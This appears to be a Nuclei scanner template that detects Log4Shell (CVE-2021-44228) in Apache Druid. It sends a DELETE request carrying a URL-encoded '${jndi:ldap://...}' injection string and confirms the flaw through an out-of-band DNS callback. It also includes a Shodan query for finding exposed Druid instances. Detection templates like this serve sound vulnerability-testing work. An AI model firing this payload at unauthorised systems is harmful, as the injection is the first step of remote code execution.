id: apache-druid-log4j-rce
info:
  name: Apache Druid - Remote Code Execution (Apache Log4j)
  author: SleepingBag945
  severity: critical
  description: Apache Druid is vulnerable to RCE due to Log4j.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-502,CWE-77
    cpe: cpe:2.3:a:apache:druid:*:*:*:*:*:*:*:*
  metadata:
    runzero-review: REJECT/2025-11-07/uses interactsh
    max-request: 1
    product: druid
    shodan-query: title:"Apache Druid"
    vendor: apache
    verified: true
  tags: apache,cve,cve2021,druid,jndi,kev,log4j,oast,rce,vuln
http:
  - matchers:
      - part: interactsh_protocol
        type: word
        words:
          - dns
      - part: header
        type: word
        words:
          - application/json
      - status:
          - 404
        type: status
    matchers-condition: and
    method: DELETE
    path:
      - '{{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d'
